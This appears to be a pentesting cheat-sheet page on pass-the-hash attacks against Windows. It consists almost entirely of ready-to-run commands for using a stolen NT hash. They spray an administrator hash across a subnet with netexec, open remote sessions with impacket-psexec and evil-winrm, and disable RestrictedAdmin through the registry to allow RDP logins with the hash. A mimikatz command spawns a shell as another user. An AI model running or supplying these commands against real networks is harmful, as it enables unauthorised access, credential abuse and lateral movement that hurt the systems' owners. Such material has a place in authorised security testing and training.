# Pass the Hash (PtH)

An attacker knowing a user's NT hash can use it to authenticate over NTLM (pass-the-hash)

{% tabs %}
{% tab title="Netexec" %}
```sh
# If we dump the SAM and get an adminitrator hash, try to spray it to other machines
netexec smb <IP>/<CIDR> -u Administrator -d . -H <HASH>
```
{% endtab %}

{% tab title="Psexec" %}
```sh
# With impacket, from linux. We could also use impacket-wmiexec, impacket-atexec
# or impacket-smbexec
impacket-psexec <USER>@<IP> -hashes :<HASH>
```
{% endtab %}

{% tab title="Evil-WinRM" %}
```sh
# With Evil-WinRM
evil-winrm -i <IP> -u Administrator -H <HASH>
```
{% endtab %}

{% tab title="RDP" %}
```sh
# With RDP => we need to set a registry to be able to use PTH or we will get an error
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f    # On the target machine
xfreerdp  /v:<IP> /u:<USER> /pth:<HASH>
```
{% endtab %}

{% tab title="Mimikatz" %}
```sh
# With mimikatz
mimikatz.exe privilege::debug "sekurlsa::pth /user:<USER> /ntlm:<HASH> /domain:<DOMAIN> /run:cmd.exe" exit
```
{% endtab %}
{% endtabs %}
